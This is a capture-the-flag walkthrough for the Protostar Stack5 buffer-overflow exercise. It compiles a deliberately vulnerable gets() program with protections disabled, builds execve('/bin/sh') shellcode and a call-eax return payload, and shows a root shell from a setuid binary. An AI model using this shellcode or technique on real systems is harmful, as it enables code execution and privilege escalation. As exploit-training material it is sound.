## Protostar-Stack5 Solution

### 1. Introduction

This is a poc solution for the "Stack5" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look. Thanks to my friend for his help in this challenge, the solution in this post is smooth.

Source:
[https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/](https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/) 
 
**Hints:**
* Stack5 is a standard buffer overflow, this time introducing shellcode.
* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
* remove the int3s once your shellcode is done.


#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 5 5.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Disassemble the main function.

```nasm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804841d <+0>:	push   ebp
   0x0804841e <+1>:	mov    ebp,esp
   0x08048420 <+3>:	and    esp,0xfffffff0
   0x08048423 <+6>:	sub    esp,0x50
   0x08048426 <+9>:	lea    eax,[esp+0x10]
   0x0804842a <+13>:	mov    DWORD PTR [esp],eax
   0x0804842d <+16>:	call   0x80482f0 <gets@plt>
   0x08048432 <+21>:	leave  
   0x08048433 <+22>:	ret    
End of assembler dump. 
```
 
This challenge seems to be similar to stack-4, only difference is we need to execute our shellcode. Offset is also same...


Let's set a breakpoint on **0x08048432**, one instruction before return of the main().

```nasm
gdb-peda$ b * 0x08048432
Breakpoint 1 at 0x8048432: file 5.c, line 11.

gdb-peda$ r 

gdb-peda$ ni
...TRIM...
EAX: 0xffffd0e0 ('A' <repeats 76 times>, "BBBBCCCCDDDD")
...
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd130 ("CCCCDDDD")
EIP: 0x42424242 ('BBBB')
...TRIM...
Invalid $PC address: 0x42424242
...TRIM...
0x42424242 in ?? ()
```

As seen above, registers eax, esp, eip, ebp are overwritten. The goal of this challenge is to obtain a command execution on target host. So we need to let target jump to our shellcode. As seen above, it's possible to write our shellcode to several places. I chose **eax** register at this time. 

#### 2.2 Quick Solution

Let's write a basic shellcode (exploit.asm).

```nasm
section .text
	global _start

_start:
	xor eax, eax ; cleaning up -> safe null
	push eax ; null-byte onto stack since it's a terminator
	push 'n/sh' ; //bi + n/sh -> 4 + 4 bytes since '//'=='/'
	push '//bi' 
	mov ebx, esp ; set ebx to out
	xor ecx, ecx ; cleaning up -> no args 
	xor edx, edx ; cleaning up -> no args
	mov al, 11 ; syscall  ->  execve()
	int 80h ; call kernel
```


Compiling our shellcode.

```
$ cat Makefile
all:
	nasm -f elf32 exploit.asm -o exploit.o
	ld -m elf_i386 exploit.o -o exploit
	rm exploit.o
	objcopy -O binary exploit exploit.bin

$ make
```

By help of **objcopy**, we copied the **.text section** in raw-hex format into the **exploit.bin** file.

```nasm
$ objdump -D exploit -M intel

exploit:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	50                   	push   eax
 8048063:	68 6e 2f 73 68       	push   0x68732f6e
 8048068:	68 2f 2f 62 69       	push   0x69622f2f
 804806d:	89 e3                	mov    ebx,esp
 804806f:	31 c9                	xor    ecx,ecx
 8048071:	31 d2                	xor    edx,edx
 8048073:	b0 0b                	mov    al,0xb
 8048075:	cd 80                	int    0x80
```

As seen on command output below, 23 bytes of shellcode is written in exploit.bin file in raw hex format.

```x86asm
$ ls -l exploit.bin 
-rwxrwxr-x 1 c c 23 Mar  1 04:21 exploit.bin

$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 0080
```

We need some padding with 76 bytes of data as an offset, therefore whatever is written after those bytes will be written onto **eip** register.

```x86asm
$ python2 -c 'print "A"*53' >> exploit.bin 

$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 000a
```

As seen on the output above, there is a **newline character** in our exploit **0a41**. This can be a badchar for our target binary. To be avoid of terminations we can use the following python code below, be sure you deleted and compiled the **exploit.bin** again.

```x86asm
$ python2 -c 'import sys; sys.stdout.write("A"*53)' >> exploit.bin

$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141
```

76 bytes can be sent by using this exploit so far, we are now able to write anything to **eip** register. The first bytes aka. **shellcode** should be overwritten onto **eax** register.  

We need an address of **call eax** instruction in our binary to jump to our shellcode by writing its address onto **eip** register.

```x86asm
$ objdump -d 5 -M intel | grep "call"
...TRIM...
 8048386:	ff d0                	call   eax
...TRIM...
 804840f:	ff d0                	call   eax
```

Let's use the address **8048386** in our exploit.
```x86asm
$ echo -ne "\x86\x83\x04\x08" >> exploit.bin
```

Final exploit.

```x86asm
c@ubuntu:~/Desktop/protostar$ hexdump -v exploit.bin 
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 8386 0804
```

Let's check if this exploit works properly or not by debugging.

```nasm
gdb-peda$ b * 0x0804842d
gdb-peda$ b * 0x08048386

gdb-peda$ r < exploit.bin

gdb-peda$ x/20wx $eax
0xffffd0e0:	0x6850c031	0x68732f6e	0x622f2f68	0x31e38969
0xffffd0f0:	0xb0d231c9	0x4180cd0b	0x41414141	0x41414141
0xffffd100:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd110:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd120:	0x41414141	0x41414141	0x41414141	0x08048386

gdb-peda$ i r eip
eip            0x8048386	0x8048386 <deregister_tm_clones+38>

gdb-peda$ c
Continuing.
process 6220 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x804842d
```

As seen on the outpu of **x/20wx $eax** command in gdb, we have obtained our goal. 

My debugger has some issues, but **/bin/dash** was executed. Let's finish this off in **Final PoC** part of this walkthrough.


#### 2.3 Final PoC

```py
python2 -c 'import sys; sys.stdout.write("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A"*53 + "\x86\x83\x04\x08")' > exploit.bin
```

Privilege escalation set up.

```js
$ sudo chown root 5
$ sudo chmod u+s 5
$ ls -l 5
-rwsrwxr-x 1 root c 8264 Mar  1 04:57 5

$ socat -dd TCP4-LISTEN:"8080",fork,reuseaddr EXEC:"./5",pty,echo=0,raw
```

From another terminal.

```js
$ (cat exploit.bin; cat) | nc localhost 8080
id
uid=1000(c) gid=1000(c) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(c)
whoami
root
```
